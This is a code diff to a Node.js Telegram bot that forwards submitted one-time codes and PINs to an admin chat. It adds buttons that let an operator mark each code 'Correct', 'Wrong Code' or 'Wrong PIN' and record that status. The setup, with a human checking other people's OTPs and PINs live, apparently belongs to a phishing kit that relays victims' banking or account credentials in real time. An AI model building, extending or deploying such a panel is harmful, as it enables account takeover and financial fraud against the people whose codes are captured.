@@ -74,7 +74,7 @@ if (botEnabled && bot) {
             return;
         }
 
-        if (action === 'verify') {
+        if (action === 'verify' || action === 'correct') {
             verification.status = 'verified';
             store.set(id, verification);
 
@@ -83,15 +83,16 @@ if (botEnabled && bot) {
                 message_id: query.message.message_id
             });
             await bot.answerCallbackQuery(query.id, { text: '✅ Verified' });
-        } else if (action === 'decline') {
-            verification.status = 'declined';
+        } else if (action === 'decline' || action === 'wrongcode' || action === 'wrongpin') {
+            verification.status = action === 'wrongcode' ? 'wrong_code' : action === 'wrongpin' ? 'wrong_pin' : 'declined';
             store.set(id, verification);
 
-            await bot.editMessageText(`❌ ${type} Declined\n\n${verification.value}\nFlow: ${verification.flow}`, {
+            const label = action === 'wrongcode' ? 'Wrong Code' : action === 'wrongpin' ? 'Wrong PIN' : 'Declined';
+            await bot.editMessageText(`❌ ${type} ${label}\n\n${verification.value}\nFlow: ${verification.flow}`, {
                 chat_id: chatId,
                 message_id: query.message.message_id
             });
-            await bot.answerCallbackQuery(query.id, { text: '❌ Declined' });
+            await bot.answerCallbackQuery(query.id, { text: `❌ ${label}` });
         }
     });
 }
@@ -108,14 +109,27 @@ function sendVerificationRequest(type, value, flow) {
 
         const message = `<b>New ${type} Verification Request</b>\n\n${type}: <code>${value}</code>\nFlow: ${flow}\n\nPlease verify or decline this request.`;
 
-        const keyboard = {
-            inline_keyboard: [
-                [
-                    { text: '✅ Verify', callback_data: `verify_${type}_${id}` },
-                    { text: '❌ Decline', callback_data: `decline_${type}_${id}` }
+        let keyboard;
+        if (type === 'OTP') {
+            keyboard = {
+                inline_keyboard: [
+                    [
+                        { text: '✅ Correct', callback_data: `correct_${type}_${id}` },
+                        { text: '❌ Wrong Code', callback_data: `wrongcode_${type}_${id}` },
+                        { text: '🔒 Wrong PIN', callback_data: `wrongpin_${type}_${id}` }
+                    ]
                 ]
-            ]
-        };
+            };
+        } else {
+            keyboard = {
+                inline_keyboard: [
+                    [
+                        { text: '✅ Verify', callback_data: `verify_${type}_${id}` },
+                        { text: '❌ Decline', callback_data: `decline_${type}_${id}` }
+                    ]
+                ]
+            };
+        }
 
         bot.sendMessage(adminChatId, message, { reply_markup: keyboard, parse_mode: 'HTML' })
             .then(() => {
